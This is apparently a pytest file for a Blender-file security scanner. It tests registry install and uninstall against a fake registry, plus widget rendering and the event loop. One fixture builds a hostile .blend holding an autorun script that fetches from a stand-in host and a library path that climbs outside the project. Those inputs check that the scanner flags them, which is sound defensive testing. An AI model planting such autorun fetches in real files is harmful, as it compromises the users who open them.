# SPDX-License-Identifier: GPL-3.0-or-later
"""Tests for the window's behaviour: the registry, the widget layer, the drain.

Split out of ``test_gui.py``, which covers the rules that hold on plain data
(no green, never the word "safe", explanation before source). What is here
needs the parts that touch something outside the process, and each is reached
through a stand-in rather than the real thing:

* **The registry.** ``install()`` and ``uninstall()`` had never run -- not in
  a test, not by hand -- and they are the only code in the product that
  changes anything on the user's system. They run here against an in-memory
  ``FakeRegistry``; **no test writes to the real registry**, and the fake
  records writes so that "nothing was written" is an assertion rather than a
  hope.
* **The Text widget.** ``ReportView.append`` is driven with a recording
  stand-in, which is how the indent-as-a-tag fix is checked without a display.
* **The Tk event loop.** The drain is driven with a fake root whose ``after``
  records callbacks instead of scheduling them.

Nothing here builds a Tk root and nothing here opens a window. The modules
under test import tkinter, so each entry point skips where Tk is absent.
"""

from __future__ import annotations

import queue
from pathlib import Path

import pytest

from blend_xray import scanner, strings
from blend_xray.gui import render, shell_integration, theme
from blend_xray.gui.render import Line
from blend_xray.gui.scan_worker import Finished, Scanned, ScanWorker

from .blend_builder import BlendBuilder, minimal_blend

HOSTILE_SCRIPT = """
import urllib.request
urllib.request.urlopen("http://drop.example-host.top/p").read()
"""


@pytest.fixture
def hostile_blend(tmp_path: Path) -> Path:
    builder = BlendBuilder()
    builder.add_text("autorun.py", HOSTILE_SCRIPT, flags=1 | 4 | 16)
    builder.add_library("//../../outside/secret.blend")
    path = tmp_path / "hostile.blend"
    path.write_bytes(builder.to_bytes())
    return path


@pytest.fixture
def empty_blend(tmp_path: Path) -> Path:
    path = tmp_path / "empty.blend"
    path.write_bytes(minimal_blend())
    return path

# -- the registry, against an in-memory stand-in -------------------------------
# install() and uninstall() had never run: not in a test, not by hand. They are
# the only code in the product that changes anything on the user's system, and
# they are shipping to hundreds of people. These exercise them for real,
# against a fake that records writes instead of making them -- the real
# registry stays untouched, which is the whole point of the fake.
class _FakeKey:
    """A handle, usable as a context manager exactly as winreg's is."""

    def __init__(self, registry: FakeRegistry, path: str) -> None:
        self.registry = registry
        self.path = path

    def __enter__(self) -> _FakeKey:
        return self

    def __exit__(self, *_exc: object) -> bool:
        return False


class FakeRegistry:
    """The five winreg calls shell_integration makes, backed by a dict.

    ``fail_with`` makes every call raise, which is how the "could not look"
    path is exercised: a registry we cannot read must raise rather than report
    the entry as absent.
    """

    HKEY_CURRENT_USER = "HKCU"
    REG_SZ = 1

    def __init__(self) -> None:
        self.values: dict[str, str] = {}
        self.fail_with: OSError | None = None

    def _check(self) -> None:
        if self.fail_with is not None:
            raise self.fail_with

    def OpenKey(self, _root: object, path: str) -> _FakeKey:
        self._check()
        if path not in self.values:
            raise FileNotFoundError(path)
        return _FakeKey(self, path)

    def QueryValueEx(self, key: _FakeKey, _name: str) -> tuple[str, int]:
        self._check()
        return self.values[key.path], self.REG_SZ

    def CreateKey(self, _root: object, path: str) -> _FakeKey:
        self._check()
        self.values.setdefault(path, "")
        return _FakeKey(self, path)

    def SetValueEx(self, key: _FakeKey, _name: str, _res: int, _kind: int, value: str) -> None:
        self._check()
        self.values[key.path] = value

    def DeleteKey(self, _root: object, path: str) -> None:
        self._check()
        if path not in self.values:
            raise FileNotFoundError(path)
        del self.values[path]


@pytest.fixture
def fake_registry(monkeypatch: pytest.MonkeyPatch) -> FakeRegistry:
    """Redirect shell_integration at an in-memory registry, on any platform."""
    registry = FakeRegistry()
    monkeypatch.setattr(shell_integration, "winreg", registry)
    monkeypatch.setattr(shell_integration, "is_supported", lambda: True)
    return registry


COMMAND_KEY = shell_integration.KEY_PATH + "\\command"


def test_install_writes_the_verb_and_its_command_and_nothing_else(
    fake_registry: FakeRegistry,
) -> None:
    assert fake_registry.values == {}, "something wrote before install() was called"
    written = shell_integration.install("Inspect with Blend X-Ray")
    assert set(fake_registry.values) == {shell_integration.KEY_PATH, COMMAND_KEY}
    assert fake_registry.values[shell_integration.KEY_PATH] == "Inspect with Blend X-Ray"
    assert fake_registry.values[COMMAND_KEY] == shell_integration.launch_command()
    assert written.command == shell_integration.launch_command()


def test_install_writes_exactly_what_the_dialog_promised(fake_registry: FakeRegistry) -> None:
    """The confirmation dialog shows plan(); install() must not write anything else."""
    promised = shell_integration.plan("Inspect with Blend X-Ray")
    shell_integration.install("Inspect with Blend X-Ray")
    assert fake_registry.values[COMMAND_KEY] == promised.command
    assert promised.key.endswith(shell_integration.KEY_PATH)


def test_a_fresh_install_reads_back_as_current(fake_registry: FakeRegistry) -> None:
    shell_integration.install("x")
    assert shell_integration.state() == shell_integration.CURRENT
    assert shell_integration.is_installed() is True
    assert shell_integration.is_current() is True


def test_an_entry_left_behind_in_a_temp_folder_is_stale_not_installed(
    fake_registry: FakeRegistry,
) -> None:
    """The zip case: Explorer runs the exe from %TEMP%, then cleans it up.

    Double-clicking BlendXRay.exe *inside* the downloaded zip makes Explorer
    extract to %TEMP%\\Temp1_<zipname>\\, so that is the path baked into the
    entry -- and it stops existing. The menu item then does nothing, and the
    button used to keep saying "Remove from right-click menu".
    """
    fake_registry.values[shell_integration.KEY_PATH] = "Inspect with Blend X-Ray"
    fake_registry.values[COMMAND_KEY] = (
        r'"C:\Users\someone\AppData\Local\Temp\Temp1_BlendXRay.zip\BlendXRay.exe" "%1"'
    )
    assert shell_integration.state() == shell_integration.STALE
    assert shell_integration.is_installed() is True
    assert shell_integration.is_current() is False


def test_moving_the_folder_after_installing_is_the_same_stale_case(
    fake_registry: FakeRegistry,
) -> None:
    shell_integration.install("x")
    fake_registry.values[COMMAND_KEY] = r'"D:\moved\BlendXRay.exe" "%1"'
    assert shell_integration.is_current() is False
    assert shell_integration.state() == shell_integration.STALE


def test_installing_over_a_stale_entry_repairs_it_in_place(
    fake_registry: FakeRegistry,
) -> None:
    """Confirming the repair is one write, not a duplicate key."""
    fake_registry.values[shell_integration.KEY_PATH] = "old label"
    fake_registry.values[COMMAND_KEY] = r'"C:\gone\BlendXRay.exe" "%1"'
    shell_integration.install("Inspect with Blend X-Ray")
    assert set(fake_registry.values) == {shell_integration.KEY_PATH, COMMAND_KEY}
    assert fake_registry.values[COMMAND_KEY] == shell_integration.launch_command()
    assert shell_integration.state() == shell_integration.CURRENT


def test_uninstall_removes_both_keys_and_leaves_nothing(fake_registry: FakeRegistry) -> None:
    shell_integration.install("x")
    shell_integration.uninstall()
    assert fake_registry.values == {}
    assert shell_integration.state() == shell_integration.ABSENT


def test_uninstall_removes_a_stale_entry_too(fake_registry: FakeRegistry) -> None:
    fake_registry.values[shell_integration.KEY_PATH] = "old"
    fake_registry.values[COMMAND_KEY] = r'"C:\gone\BlendXRay.exe" "%1"'
    shell_integration.uninstall()
    assert fake_registry.values == {}


def test_uninstall_is_not_an_error_when_the_entry_is_already_gone(
    fake_registry: FakeRegistry,
) -> None:
    shell_integration.uninstall()
    assert fake_registry.values == {}


def test_a_registry_we_cannot_read_raises_instead_of_reporting_absent(
    fake_registry: FakeRegistry,
) -> None:
    """Saying "not installed" when we simply could not look is the class of
    lie this whole tool exists to avoid."""
    fake_registry.fail_with = OSError("access denied")
    with pytest.raises(shell_integration.ShellIntegrationError):
        shell_integration.state()


def test_a_registry_we_cannot_write_raises_rather_than_reporting_success(
    fake_registry: FakeRegistry,
) -> None:
    fake_registry.fail_with = OSError("access denied")
    with pytest.raises(shell_integration.ShellIntegrationError):
        shell_integration.install("x")
    with pytest.raises(shell_integration.ShellIntegrationError):
        shell_integration.uninstall()


def test_nothing_is_written_merely_by_asking_about_the_state(
    fake_registry: FakeRegistry,
) -> None:
    shell_integration.state()
    shell_integration.plan("x")
    shell_integration.launch_command()
    shell_integration.is_installed()
    assert fake_registry.values == {}


# -- the widget layer, through a recording stand-in ---------------------------
# These reach report_view and app, which import tkinter. They never build a
# root and never open a window: the widgets are replaced by objects that
# record what they were asked to draw. Where Tk is not installed at all they
# skip rather than fail, so the rules above still run on a bare machine.
class _RecordingText:
    """Records the (text, tags) pairs ReportView hands the Text widget."""

    def __init__(self) -> None:
        self.inserts: list[tuple[str, object]] = []

    def configure(self, **_kwargs: object) -> None:
        pass

    def insert(self, _index: str, text: str, tags: object = None) -> None:
        self.inserts.append((text, tags))


def _draw(elements: list[render.Element]) -> list[tuple[str, object]]:
    """Run ReportView.append against a recording text widget."""
    pytest.importorskip("tkinter", reason="report_view imports tkinter")
    from blend_xray.gui.report_view import ReportView

    view = ReportView.__new__(ReportView)
    view._elements = []
    view._collapsed = {}
    view._next_source_id = 0
    view._rules = []
    view.text = _RecordingText()
    # Both of these build real widgets parented to the Text; substitute a
    # marker so the drawing path under test can run without a Tk root.
    view._insert_rule = lambda: view.text.inserts.append(("<rule>", None))
    view._insert_source = lambda src: view.text.inserts.append(("<source>", src.indent))
    ReportView.append(view, elements)
    return view.text.inserts


def test_indent_reaches_the_widget_as_a_tag_not_as_leading_spaces() -> None:
    """The bug: the indent was in the text, and wrap="word" ignores it after
    the first visual line. A tag carrying lmargin1/lmargin2 does not."""
    drawn = _draw([Line("evidence", theme.TAG_DIM, indent=3)])
    text, tags = drawn[0]
    assert text == "evidence\n", "the indent must not be inserted as spaces"
    assert theme.indent_tag(3) in tags
    assert theme.TAG_DIM in tags


def test_every_drawn_line_carries_an_indent_tag(hostile_blend: Path) -> None:
    elements = render.render_result(scanner.scan_file(hostile_blend))
    for text, tags in _draw(elements):
        if text in {"<rule>", "<source>"} or tags is None:
            continue
        assert any(str(tag).startswith("indent") for tag in tags), text


def test_a_separator_element_is_drawn_as_a_widget_not_as_text(
    hostile_blend: Path,
) -> None:
    elements = render.render_result(scanner.scan_file(hostile_blend))
    drawn = _draw(elements)
    rules = [text for text, _ in drawn if text == "<rule>"]
    assert len(rules) == sum(isinstance(e, render.Separator) for e in elements)
    assert rules, "the section rules disappeared entirely"


def test_both_margins_are_set_for_every_indent_level() -> None:
    """lmargin2 is the half that was missing; the pair is returned together."""
    for level in range(theme.MAX_INDENT_LEVEL + 1):
        options = theme.indent_margins(level)
        assert set(options) == {"lmargin1", "lmargin2"}
        assert options["lmargin1"] == options["lmargin2"] == level * theme.INDENT_PIXELS
    assert theme.indent_margins(0)["lmargin2"] == 0
    assert theme.indent_margins(1)["lmargin2"] > 0


# -- the drain loop -----------------------------------------------------------
class _FakeWidget:
    """A button, label or progress bar, as far as the window is concerned."""

    def __init__(self) -> None:
        self.state = "normal"
        self.text = ""
        self.gridded = False
        self.running = False

    def configure(self, **kwargs: object) -> None:
        if "state" in kwargs:
            self.state = str(kwargs["state"])
        if "text" in kwargs:
            self.text = str(kwargs["text"])

    def grid(self, **_kwargs: object) -> None:
        self.gridded = True

    def grid_remove(self) -> None:
        self.gridded = False

    def start(self, _interval: int = 0) -> None:
        self.running = True

    def stop(self) -> None:
        self.running = False


class _FakeView:
    def __init__(self) -> None:
        self.elements: list[render.Element] = []

    def append(self, elements: list[render.Element]) -> None:
        self.elements.extend(elements)

    def clear(self) -> None:
        self.elements = []


class _FakeRoot:
    def __init__(self) -> None:
        self.scheduled: list[object] = []

    def after(self, _ms: int, callback: object) -> None:
        self.scheduled.append(callback)


def _fake_window(events: list[object]) -> object:
    """A BlendXRayWindow with every widget replaced, and no Tk root at all."""
    pytest.importorskip("tkinter", reason="the window module imports tkinter")

    from blend_xray.gui.app import BlendXRayWindow

    window = BlendXRayWindow.__new__(BlendXRayWindow)
    window.root = _FakeRoot()
    window.entries = []
    window.view = _FakeView()
    window.status = _FakeWidget()
    window.progress = _FakeWidget()
    window.btn_file = _FakeWidget()
    window.btn_folder = _FakeWidget()
    window.btn_cancel = _FakeWidget()
    window.btn_shell = None
    worker = ScanWorker([])
    worker.events = queue.Queue()
    for event in events:
        worker.events.put(event)
    window.worker = worker
    return window


def test_a_failure_while_drawing_one_result_does_not_freeze_the_window(
    empty_blend: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One raise inside render_result used to end the loop for good.

    _drain reschedules itself and nothing else does, so an exception escaping
    it left File and Folder disabled and the spinner turning forever -- with
    no message, because a windowed PyInstaller build has sys.stderr is None
    and Tk's report_callback_exception writes the traceback nowhere.
    """
    result = scanner.scan_file(empty_blend)
    window = _fake_window([Scanned(result=result), Finished(done=1, total=1, cancelled=False)])
    window._set_busy(True)

    def boom(_result: object) -> list[render.Element]:
        raise RuntimeError("renderer exploded")

    monkeypatch.setattr(render, "render_result", boom)
    window._drain()

    assert window.btn_file.state == "normal", "the toolbar was left disabled"
    assert window.btn_folder.state == "normal"
    assert window.progress.running is False, "the spinner was left turning"
    assert window.root.scheduled == [], "the loop kept polling a finished worker"


def test_the_drawing_failure_is_reported_in_the_window(
    empty_blend: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """sys.stderr is None in a windowed build, so the window is the only place."""
    result = scanner.scan_file(empty_blend)
    window = _fake_window([Scanned(result=result)])
    monkeypatch.setattr(render, "render_result", _raise_renderer_exploded)
    window._drain()

    drawn = [e for e in window.view.elements if isinstance(e, Line)]
    assert drawn, "the failure was swallowed silently"
    assert any("renderer exploded" in e.text for e in drawn)
    assert any("RuntimeError" in e.text for e in drawn), "the reason has to be readable"
    assert any(e.tag == theme.TAG_ALARM for e in drawn)
    # The status bar says it too, but the report area is the durable copy: a
    # later event overwrites the status line and nothing overwrites the report.
    assert "renderer exploded" in window.status.text


def test_one_unrenderable_result_does_not_cost_the_rest_of_the_batch(
    empty_blend: Path, hostile_blend: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The event is already off the queue when drawing fails, so the scan goes on."""
    bad = scanner.scan_file(empty_blend)
    good = scanner.scan_file(hostile_blend)
    window = _fake_window(
        [
            Scanned(result=bad),
            Scanned(result=good),
            Finished(done=2, total=2, cancelled=False),
        ]
    )
    real = render.render_result

    def selective(result: object) -> list[render.Element]:
        if result is bad:
            raise ValueError("this one only")
        return real(result)

    monkeypatch.setattr(render, "render_result", selective)
    window._drain()

    drawn = render.plain_text(window.view.elements)
    assert "this one only" in drawn, "the failure was not reported"
    assert "urllib" in drawn, "the second file was lost with the first"
    # Both are kept: the *scan* succeeded for both, only the drawing failed,
    # and a stored entry is what a later language switch re-renders.
    assert window.entries == [bad, good]
    assert window.btn_file.state == "normal"


def test_redrawing_an_unrenderable_entry_reports_instead_of_raising(
    empty_blend: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A language switch re-renders stored entries from a Tk callback.

    Same invisible stderr, same need to say so in the window.
    """
    window = _fake_window([])
    window.entries = [scanner.scan_file(empty_blend)]
    window.startup_error = None
    monkeypatch.setattr(render, "render_result", _raise_renderer_exploded)
    window._redraw()
    assert any(
        isinstance(e, Line) and "renderer exploded" in e.text for e in window.view.elements
    )


def test_a_failure_on_the_finished_event_still_re_enables_the_window(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The event that would have released the toolbar is the one that blew up."""
    window = _fake_window([Finished(done=0, total=0, cancelled=False)])
    window._set_busy(True)

    def boom(_event: object) -> None:
        raise RuntimeError("finish handler exploded")

    monkeypatch.setattr(type(window), "_on_finished", staticmethod(boom))
    window._drain()

    assert window.btn_file.state == "normal"
    assert window.progress.running is False
    assert window.root.scheduled == []
    assert "finish handler exploded" in window.status.text


def test_a_normal_pass_still_reschedules_itself(empty_blend: Path) -> None:
    """The guard must not have turned a working loop into a one-shot."""
    window = _fake_window([Scanned(result=scanner.scan_file(empty_blend))])
    window._drain()
    assert len(window.root.scheduled) == 1
    assert window.view.elements, "the result was not drawn"


def _raise_renderer_exploded(_result: object) -> list[render.Element]:
    raise RuntimeError("renderer exploded")


# -- the three-state right-click button ---------------------------------------
def test_every_registry_state_has_a_button_label() -> None:
    pytest.importorskip("tkinter", reason="the window module imports tkinter")
    from blend_xray.gui.app import SHELL_BUTTON_KEYS

    states = {shell_integration.ABSENT, shell_integration.CURRENT, shell_integration.STALE}
    assert set(SHELL_BUTTON_KEYS) == states
    for key in SHELL_BUTTON_KEYS.values():
        assert not strings.t(key).startswith("!["), key
    assert len(set(SHELL_BUTTON_KEYS.values())) == 3, "a stale entry needs its own label"
